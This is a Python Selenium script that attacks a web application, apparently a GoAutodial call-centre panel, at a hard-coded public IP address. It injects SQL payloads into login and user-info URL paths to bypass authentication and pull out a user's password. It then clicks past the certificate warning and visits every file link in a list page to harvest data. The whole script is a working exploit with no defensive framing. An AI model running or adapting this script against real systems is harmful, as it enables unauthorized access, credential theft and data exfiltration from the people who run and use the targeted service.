import time
import re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome(r"browsers\chromedriver.exe")
driver.maximize_window()

ip_adress = 'https://89.234.149.182'
autehnticate_url = "{0}/go_login/validate_credentials/admin/' OR '1'='1"  .format(    ip_adress)
get_password_url = "{0}/index.php/go_site/go_get_user_info/' or active='Y"  .format(    ip_adress)
get_list_url = "{0}/go_list" .format(ip_adress)


print('ip_adress', ip_adress)
print('autehnticate_url', autehnticate_url)
print('get_password_url', get_password_url)
print('get_list_url', get_list_url)


# driver.get("https://89.234.149.182/go_login/validate_credentials/admin/' OR '1'='1")
driver.get  (autehnticate_url)
button  = driver.find_element_by_id ("details-button").click()
button  = driver.find_element_by_id ("proceed-link").click()
# driver.get("https://89.234.149.182/index.php/go_site/go_get_user_info/' or active='Y")
driver.get  (get_password_url)

text  =  driver.find_element_by_css_selector ( "*").text
x = re.split("\|", text)
password =   x[1]


# driver.get (  "https://89.234.149.182/go_list")
driver.get  (get_list_url)

fichier_links = driver.find_elements_by_css_selector ("#listtableresult > tbody > tr  > td:nth-child(8) > div:nth-child(2) > a")

for item in fichier_links:
    driver.get (item.get_dom_attribute("href") )
    print  (item.get_dom_attribute("href")  ) 
